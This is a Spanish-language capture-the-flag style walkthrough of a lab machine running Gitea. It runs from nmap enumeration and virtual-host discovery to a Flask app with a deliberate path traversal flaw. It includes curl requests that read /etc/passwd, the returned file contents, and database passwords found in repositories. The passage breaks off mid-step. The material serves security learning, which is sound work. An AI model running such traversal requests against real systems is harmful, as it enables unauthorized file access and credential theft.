## FASE DE ENUMERACIÓN

Lanzamos un scaner con nmap para ver que puertos tiene abiertos la máquina victima y los servicios que cooren por ellos:
```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN PuertosYservicios  
```
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e5:9a:b5:5e:a7:fc:3b:2f:7e:62:dd:51:61:f5:aa:2e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJlX8HUpWECJWj9EBrcZdu7DR/IKU6sQIn2Rx8jrDxZGYYrXV7Su2UZ/wR8Y0Do26H/h0wW9p3hm6mGn5F5ZUOw=
|   256 8e:ff:03:d7:9b:72:10:c9:72:03:4d:b8:bb:77:e9:b2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHGFlZunFEFvg/diGF3I2AwlkL8QHCxO4Wjzp2KMNDJm
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Gitea: Git with a cup of tea
| http-methods: 
|_  Supported Methods: HEAD GET
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 8C971BC353008D67BA53965E12AE5A43
3000/tcp open  http    syn-ack ttl 64 Golang net/http server
|_http-title: Gitea: Git with a cup of tea
|_http-favicon: Unknown favicon MD5: F6E1A9128148EEAD9EFF823C540EF471
| http-methods: 
|_  Supported Methods: HEAD GET
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=d20d49b100a58736; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=uVFlDSwgUs5nVrqUzk7_t7o3mZE6MTc0MTE5MTcyMDYwMTA4ODM0NQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 05 Mar 2025 16:22:00 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" data-theme="gitea-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2FkbWluLnMzY3IzdGRpci5kZXYuZ2l0ZWEuZGwvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9hZG1pbi5zM2NyM3RkaXIuZGV2LmdpdGVhLmRsL2Fzc2V0cy9pbWcvbG9nby5wbm

```
Tenemos un puerto 22 con SSH en versión no vulnerable, sin user ni pass lo dejamos de momento
Tenemos 2 servicos http, uno corre por el puerto 80 y otro por el 3000

abrimos en el navegador http://172.17.0.2 y buscamos algo en su código fuente y no encontramos nada.
abrimos en el navegado el http://172.17.0.2:3000 y buscamos en el código fuente, y encontramos esto:
```
</noscript>
	
	<meta property="og:title" content="Gitea: Git with a cup of tea">
	<meta property="og:type" content="website">
	<meta property="og:image" content="/assets/img/logo.png">
	<meta property="og:url" content="http://admin.s3cr3tdir.dev.gitea.dl/">
	<meta property="og:description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go">
```

vemos que se utiliza virtual hosting y nos da una direccion http://admin.s3cr3tdir.dev.gitea.dl/, abrimos el /etc/hosts y añadimos 
el subdominio y aprovechamos y metemos retroactivamente el resto quedando así:

```bash
172.17.0.2      admin.s3cr3tdir.dev.gitea.dl gitea.dl dev.gitea.dl s3cr3tdir.dev.gitea.dl
```
en el navegador nos vamos al subdominio mencionado y vemos una plantilla gitea, si añadimos en el buscado "/explore/users" podremos listar los usuarios:
```bash
http://admin.s3cr3tdir.dev.gitea.dl/explore/users
```
vemos dos users que apuntamos como posibles usuarios para el SSH:
-designer
-admin

El repositorio de admin está vacio, así que nos centramos en el del usuario designer, vamos a:
```
http://admin.s3cr3tdir.dev.gitea.dl/designer
```
vermos tres repositorios y nos centramos en el de "myapp"
```bash
http://admin.s3cr3tdir.dev.gitea.dl/designer/myapp/
```
vemos una app y antes de analizar vamos a mirar los commint:
```bash
http://admin.s3cr3tdir.dev.gitea.dl/designer/myapp/commits/branch/main
```
y vemos dos historicos, en este concretamente:
```bash
http://admin.s3cr3tdir.dev.gitea.dl/designer/myapp/commit/14a31ecee9376588ead735a51d9934db7983f2d3
```
vemos esto:
```
@app.route("/download", methods=["GET"])
def download():
    filename = request.args.get("filename")  # Se obtiene de la URL
    filename = request.args.get("filename")

    if not filename:
        flash("Se requiere un nombre de archivo", "danger")
        return redirect(url_for("index"))

    # **Vulnerabilidad**: No se valida el path, permitiendo Path Traversal
    file_path = os.path.join(app.config["UPLOAD_FOLDER"], filename)

    if os.path.exists(file_path):

```
parece ser que es vulnerable a path traversal, vamos a analizar un poco el código de la app:
```
from flask import Flask, request, render_template, send_file, redirect, url_for, flash
import os

app = Flask(__name__)
app.secret_key = "supersecretkey"

UPLOAD_FOLDER = "uploads"
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        if "file" not in request.files:
            flash("No se ha seleccionado ningún archivo", "danger")
            return redirect(request.url)

        file = request.files["file"]

        if file.filename == "":
            flash("No se ha seleccionado ningún archivo", "danger")
            return redirect(request.url)

        file_path = os.path.join(app.config["UPLOAD_FOLDER"], file.filename)
        file.save(file_path)
        flash(f'Archivo "{file.filename}" subido correctamente.', "success")

    files = os.listdir(UPLOAD_FOLDER)
    return render_template("index.html", files=files)


@app.route("/download", methods=["GET"])
def download():
    filename = request.args.get("filename")

    if not filename:
        flash("Se requiere un nombre de archivo", "danger")
        return redirect(url_for("index"))

    file_path = os.path.join(app.config["UPLOAD_FOLDER"], filename)

    if os.path.exists(file_path):
        return send_file(file_path, as_attachment=True)

    flash("Archivo no encontrado", "danger")
    return redirect(url_for("index"))


if __name__ == "__main__":
    app.run(debug=True)
```
podemos ver una ruta llamada "/download" y un argumento "file" que probablemente nos ayude al pathtraversal, vamos a probarlo:
* Nota: probé con los subdominios hasta que me respondió gitea.dl
ponemos en el buscador:
```bash
http://gitea.dl/download?filename=../../../../../etc/passwd
```
y nos descarga un archivo dónde efectivamente está el /etc/passwd, pruebo con curl ya que no quiero mil archivos en mi máquina:
```bash
curl "http://gitea.dl/download?filename=../../../../../etc/passwd"
```
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
designer:x:1001:1001::/home/designer:/bin/bash
_galera:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:103:MariaDB Server,,,:/nonexistent:/bin/false
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
```
Después de trastear y no encontrar nada relevante me acuerdo de que había más proyectos e indago nuevamente en ellos,
uno que nos "puede" dar unas credenciales de mysql:
```
 <MYSQL_ROOT_PASSWORD>root123</MYSQL_ROOT_PASSWORD>
        <MYSQL_DATABASE>gitea</MYSQL_DATABASE>
        <MYSQL_USER>designer</MYSQL_USER>
        <MYSQL_PASSWORD>designer123</MYSQL_PASSWORD>
```
y otro que nos da unas rutas de gitea:
```
<volume>/home/designer/gitea:/data</volume>
            <volume>/home/designer/gitea:/data/info.txt</volume>
            <volume>/opt/"INFO_FILE"</volume>
        </volumes>
        <environment>
            <variable name="GITEA__database__DB_TYPE">sqlite3</variable>
            <variable name="GITEA__database__PATH">/data/gitea.db</variable>
```

En esta parte concretamente nos vamos a centrar, vemos "<volume>/home/designer/gitea:/data/info.txt</volume>" pues vamos a hacer una peticion curl con ep pathtraversal:
```bash
